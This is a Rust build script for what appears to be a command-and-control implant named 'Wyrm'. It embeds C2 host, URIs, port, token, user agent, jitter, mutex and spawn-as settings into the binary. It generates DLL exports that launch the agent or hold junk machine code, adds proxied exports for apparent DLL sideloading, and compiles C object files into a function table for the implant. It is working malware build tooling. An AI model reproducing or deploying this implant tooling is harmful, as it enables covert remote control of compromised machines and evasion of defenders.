use std::{env, fmt::Write, fs, mem::take, path::PathBuf, process::Command};

fn main() {
    let envs = &[
        "DEF_SLEEP_TIME",
        "C2_HOST",
        "C2_URIS",
        "C2_PORT",
        "SECURITY_TOKEN",
        "USERAGENT",
        "AGENT_NAME",
        "JITTER",
        "SVC_NAME",
        "EXPORTS_JMP_WYRM",
        "EXPORTS_USR_MACHINE_CODE",
        "EXPORTS_PROXY",
        "MUTEX",
        "DEFAULT_SPAWN_AS",
        "WOF",
    ];

    for key in envs {
        println!("cargo:rerun-if-env-changed={key}");
    }

    for var in envs {
        if let Ok(val) = env::var(var) {
            println!("cargo:rustc-env={var}={val}");
        }
    }

    write_exports_to_build_dir();
    build_static_wofs();
}

/// Writes exported symbols to the binary, whether genuine exports or proxied ones.
fn write_exports_to_build_dir() {
    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let dest = out_dir.join("custom_exports.rs");
    let mut code = String::new();

    let exports_usr_machine_code = env::var("EXPORTS_USR_MACHINE_CODE").ok();
    let exports_proxy = env::var("EXPORTS_PROXY").ok();
    let exports_jmp_wyrm = env::var("EXPORTS_JMP_WYRM").ok();

    if let Some(export_str) = exports_jmp_wyrm {
        if export_str.is_empty() {
            // If there was no custom export defined, then we just export the 'run' extern
            writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
        }

        for fn_name in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            writeln!(
                &mut code,
                "build_dll_export_by_name_start_wyrm!({fn_name});",
            )
            .unwrap();
        }
    } else {
        // Just in case.. we still need an entrypoint, tho this should never run
        writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
    }

    if let Some(export_str) = exports_usr_machine_code {
        for item in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            let mut parts = item.split('=');
            let name = parts.next().unwrap().trim();
            let bytes = parts.next().unwrap_or("").trim();

            assert!(!name.is_empty());
            assert!(!bytes.is_empty());

            writeln!(
                &mut code,
                "build_dll_export_by_name_junk_machine_code!({name}, {bytes});",
            )
            .unwrap();
        }
    }

    if let Some(exports) = exports_proxy {
        for item in exports
            .split(';')
            .map(|s| s.trim())
            .filter(|s| !s.is_empty() && s.is_ascii())
        {
            println!("cargo:rustc-link-arg=/export:{item}");
        }
    }

    fs::write(dest, code).unwrap();
}

fn build_static_wofs() {
    let out_dir = PathBuf::from(std::env::var("OUT_DIR").unwrap());
    let dest = out_dir.join("wof.rs");
    let mut ffi_builder = String::new();
    let mut lookup_builder = String::new();

    ffi_builder.push_str("use core::ffi::c_void;\n");
    lookup_builder.push_str("\npub fn all_wofs() -> &'static [(&'static str, *const c_void)] {\n");
    lookup_builder.push_str("&[\n");

    if let Ok(Some(args)) = parse_wof_directories() {
        ffi_builder.push_str("unsafe extern \"C\" {\n");

        let mut i = 0;
        for arg in args {
            let mut builder = cc::Build::new();
            //
            // Iterate through the headers and source files
            //
            for a in arg.headers {
                builder.include(a);
            }

            for a in arg.files {
                builder.file(a);
            }

            // Compile it
            builder.compile(&format!("wof_{i}"));

            //
            // Grab symbols from the compiled library and add them to our ephemeral build rust file which
            // will allow us to use it in the main code
            //
            if let Some(symbols) = dump_symbols(&format!("{}\\wof_{i}.lib", out_dir.display())) {
                for s in symbols {
                    let export_line = format!("fn {s}(_: *const c_void) -> i32;\n");
                    if !ffi_builder.contains(&export_line) {
                        ffi_builder.push_str(&export_line);
                        lookup_builder.push_str(&format!("(\"{s}\", {s} as *const c_void),\n"));
                    }
                }
            }

            i += 1;
        }

        ffi_builder.push_str("}\n\n");
    }

    lookup_builder.push_str("]\n}\n");

    ffi_builder.push_str(&lookup_builder);

    fs::write(dest, ffi_builder).unwrap();
}

struct ArgsPerFolder {
    files: Vec<String>,
    headers: Vec<String>,
}

fn parse_wof_directories() -> std::io::Result<Option<Vec<ArgsPerFolder>>> {
    if let Some(args) = env::var("WOF").ok() {
        let mut buf_file = Vec::new();
        let mut buf_headers = Vec::new();
        let mut result = Vec::new();

        for item in args.split(";") {
            let path = PathBuf::from(item);
            if path.is_dir() {
                for read_dir in path.read_dir()? {
                    if let Ok(f) = read_dir {
                        let full_path = f.path();
                        let full_path = full_path.to_string_lossy().to_string();
                        let name = f.file_name();
                        let name = name.to_string_lossy();
                        if name.ends_with(".h") || name.ends_with(".hpp") {
                            buf_headers.push(full_path);
                        } else if name.ends_with(".c")
                            || name.ends_with(".cpp")
                            || name.ends_with(".cc")
                        {
                            buf_file.push(full_path);
                        }
                    }
                }
            }

            // Using a take here will clear the buffer also, and we get round loop move semantics
            // without a clone
            result.push(ArgsPerFolder {
                files: take(&mut buf_file),
                headers: take(&mut buf_headers),
            });
        }

        return Ok(Some(result));
    }

    Ok(None)
}

fn dump_symbols(lib: &str) -> Option<Vec<String>> {
    let out = Command::new("llvm-nm")
        .args(["-U", "-g", "--defined-only", lib])
        .output()
        .expect("llvm-nm failed");

    let mut buf = Vec::new();

    let stdout = String::from_utf8_lossy(&out.stdout);
    for line in stdout.lines() {
        if line.contains(" T ") {
            let s: Vec<&str> = line.split(" T ").collect();

            if !s.is_empty() && s.len() == 2 {
                buf.push(s[1].to_string());
            }
        }
    }

    if buf.is_empty() {
        return None;
    }

    Some(buf)
}
